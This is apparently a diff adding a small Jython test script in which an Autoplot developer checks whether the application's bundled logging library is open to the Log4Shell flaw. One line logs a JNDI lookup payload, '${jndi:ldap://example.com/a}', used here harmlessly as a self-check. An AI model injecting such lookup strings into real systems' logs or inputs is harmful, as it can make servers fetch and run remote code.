@@ -1,0 +1,12 @@
+setScriptDescription('''See if I can demo the Log4J volnerability, see
+https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/.
+I believe that the log4J version within Autoplot is too old to show this
+problem.  Autoplot itsself has always Java's built-in logging.''')
+
+#from org.apache.log4j import Logger  # modern Log4J not within Autoplot.
+from org.apache.commons.logging import LogFactory
+
+log= LogFactory.getLog('test')
+log.info( '${jndi:ldap://example.com/a}' )
+
+print 'It doesn''t look like the old Log4J in Autoplot has macros like that.'
